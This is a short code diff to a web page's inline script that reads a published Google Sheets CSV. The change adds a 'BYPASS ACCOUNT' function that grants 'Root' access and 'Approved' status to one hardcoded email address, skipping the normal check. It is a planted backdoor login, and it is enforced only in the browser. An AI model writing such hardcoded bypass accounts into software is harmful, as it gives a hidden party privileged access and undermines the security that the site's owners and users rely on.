@@ -53,7 +53,19 @@
 
   <script>
     const CSV_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vSzw09XQbV3iW1OI38K1obHoCYgexBMYB7KsOI8IYWG9M9dox0-glYnioiYpr1B8kIafl28NK_q4Hdu/pub?output=csv";
-
+  // ⭐ BYPASS ACCOUNT ⭐
+  function bypassCheck(email) {
+    if (email.toLowerCase() === "clippycorp@outlook.com") {
+      return {
+        ok: true,
+        bypass: true,
+        fullName: "ClippyCorp System",
+        accessLevel: "Root",
+        status: "Approved"
+      };
+    }
+    return null;
+  }
     const statusEl = document.getElementById("status");
     const tableHead = document.querySelector("#db-table thead");
     const tableBody = document.querySelector("#db-table tbody");
